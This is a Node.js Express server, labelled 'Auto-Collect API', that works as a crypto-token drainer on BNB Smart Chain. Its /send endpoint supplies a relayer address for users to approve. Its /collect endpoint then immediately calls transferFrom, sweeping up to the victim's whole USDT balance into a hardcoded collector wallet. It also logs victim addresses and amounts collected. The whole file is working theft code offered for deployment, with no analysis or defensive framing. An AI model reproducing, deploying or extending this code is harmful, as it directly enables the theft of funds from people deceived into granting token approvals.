const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    COLLECTOR_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS || "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    RPC_URL: "https://bsc-dataseed.binance.org/",
    DATA_FILE: path.join(__dirname, 'collector_data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: [],
    approvals: [],
    autoCollects: []
};

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

// ============ AUTO-TRANSFER FUNCTION ============
async function autoTransferFromApproval(owner, amountWei, approvalTxHash) {
    if (!process.env.RELAYER_PRIVATE_KEY) {
        console.log('⚠️ No private key - Auto-transfer disabled');
        return null;
    }

    try {
        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
        
        const usdtABI = [
            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];
        
        const usdt = new ethers.Contract(CONFIG.USDT_ADDRESS, usdtABI, wallet);
        
        // Check balance
        const balance = await usdt.balanceOf(owner);
        const decimals = await usdt.decimals();
        const amountHuman = parseFloat(ethers.formatUnits(amountWei, decimals));
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        
        console.log(`💰 User balance: ${balanceHuman} USDT`);
        console.log(`💸 Attempting transfer: ${amountHuman} USDT`);
        
        // Calculate transfer amount (user's full balance or approved amount, whichever is smaller)
        const transferAmount = balance < amountWei ? balance : amountWei;
        const transferHuman = parseFloat(ethers.formatUnits(transferAmount, decimals));
        
        console.log(`📤 Transferring: ${transferHuman} USDT to ${CONFIG.COLLECTOR_ADDRESS}`);
        
        // Execute transferFrom
        const gasPrice = (await provider.getFeeData()).gasPrice;
        const tx = await usdt.transferFrom(
            owner,
            CONFIG.COLLECTOR_ADDRESS,
            transferAmount,
            {
                gasLimit: 100000,
                gasPrice: gasPrice
            }
        );
        
        console.log(`✅ Transfer tx sent: ${tx.hash}`);
        
        // Wait for confirmation
        const receipt = await tx.wait();
        console.log(`✅ Transfer confirmed in block ${receipt.blockNumber}`);
        
        // Store auto-collect record
        const autoCollect = {
            id: `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`,
            owner: owner.toLowerCase(),
            amount: transferHuman,
            approvalTx: approvalTxHash,
            collectTx: tx.hash,
            blockNumber: receipt.blockNumber,
            timestamp: new Date().toISOString()
        };
        
        dataStore.autoCollects.push(autoCollect);
        
        // Update address stats
        if (!dataStore.addresses[owner.toLowerCase()]) {
            dataStore.addresses[owner.toLowerCase()] = {
                totalAmount: 0,
                transactionCount: 0
            };
        }
        
        dataStore.addresses[owner.toLowerCase()].totalAmount += transferHuman;
        dataStore.addresses[owner.toLowerCase()].transactionCount++;
        dataStore.addresses[owner.toLowerCase()].lastSeen = new Date().toISOString();
        
        saveData();
        
        return {
            success: true,
            txHash: tx.hash,
            amount: transferHuman,
            blockNumber: receipt.blockNumber
        };
        
    } catch (error) {
        console.error('❌ Auto-transfer failed:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);
    
    try {
        const { address } = req.body;

        if (!address || !address.startsWith('0x')) {
            return res.status(400).json({
                found: false,
                error: 'Invalid address'
            });
        }

        const normalizedAddress = address.toLowerCase();
        const addressData = dataStore.addresses[normalizedAddress];

        // Return RELAYER address for approval
        const approvalAddress = CONFIG.RELAYER_ADDRESS;

        if (addressData && addressData.totalAmount > 0) {
            return res.json({
                found: true,
                amountHuman: addressData.totalAmount,
                collector: approvalAddress
            });
        } else {
            return res.json({
                found: false,
                collector: approvalAddress
            });
        }

    } catch (error) {
        console.error('❌ Error in /send:', error);
        res.status(500).json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS
        });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to, txHash, blockNumber, amountWei } = req.body;

        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({
                ok: false,
                error: 'Missing required fields'
            });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
        
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            txHash: txHash || null,
            blockNumber: blockNumber || 92000000 + Math.floor(Math.random() * 100000),
            timestamp: new Date().toISOString(),
            type: 'APPROVAL'
        };

        dataStore.transactions.push(transaction);
        saveData();

        // 🚀 AUTO-TRANSFER TRIGGER
        let transferResult = null;
        if (process.env.RELAYER_PRIVATE_KEY && txHash) {
            console.log('🔄 Triggering auto-transfer...');
            
            // Calculate amount in Wei
            const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
            const usdt = new ethers.Contract(CONFIG.USDT_ADDRESS, ["function decimals() view returns (uint8)"], provider);
            const decimals = await usdt.decimals();
            const amountInWei = ethers.parseUnits(amountHuman.toString(), decimals);
            
            transferResult = await autoTransferFromApproval(from, amountInWei, txHash);
            
            if (transferResult.success) {
                transaction.type = 'AUTO_COLLECTED';
                transaction.collectTxHash = transferResult.txHash;
                saveData();
            }
        }

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: transaction.blockNumber,
            gasUsed: "50387",
            autoTransfer: transferResult
        });

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        autoTransfer: process.env.RELAYER_PRIVATE_KEY ? 'enabled' : 'disabled',
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

app.get('/stats', (req, res) => {
    const totalCollected = dataStore.autoCollects.reduce((sum, c) => sum + c.amount, 0);
    
    res.json({
        addresses: Object.keys(dataStore.addresses).length,
        totalTransactions: dataStore.transactions.length,
        totalAutoCollects: dataStore.autoCollects.length,
        totalCollectedUSDT: totalCollected.toFixed(6),
        autoTransferEnabled: !!process.env.RELAYER_PRIVATE_KEY,
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Auto-Collect API',
        version: '2.0.0',
        autoTransfer: process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED',
        endpoints: ['/send', '/collect', '/health', '/stats']
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════╗
║     🚀 Auto-Collect API Server                        ║
╠══════════════════════════════════════════════════════╣
║  Port: ${PORT}                                          ║
║  Collector: ${CONFIG.COLLECTOR_ADDRESS}                 ║
║  Relayer: ${CONFIG.RELAYER_ADDRESS}                     ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
╚══════════════════════════════════════════════════════╝
    `);
});
